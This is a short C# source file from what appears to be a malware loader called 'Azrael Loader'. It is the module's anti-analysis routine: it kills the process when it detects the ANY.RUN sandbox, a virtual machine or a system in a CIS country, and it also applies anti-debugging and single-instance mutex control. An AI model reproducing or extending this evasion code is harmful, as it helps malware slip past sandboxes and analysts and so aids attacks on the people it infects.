using System;

namespace Azrael_Loader.Modules.Protects
{
    internal class Anti
    {
        public static void Protect()
        {
            if (config.AntiAnyRun && Runtime.AntiAnyRun())
            {
                Environment.FailFast("");
            }

            if (config.AntiVM && (Runtime.AntiVM_Process() || Runtime.AntiVM_GPU()))
            {
                Environment.FailFast("");
            }

            if (config.AntiCIS && CisCheck.IsCIS())
            {
                Environment.FailFast("");
            }

            if (config.AntiDebug)
            {
                Runtime.AntiProcess();
            }

            if (config.MutexControl)
            {
                MutexControl.Initialize();
            }
        }
    }
}
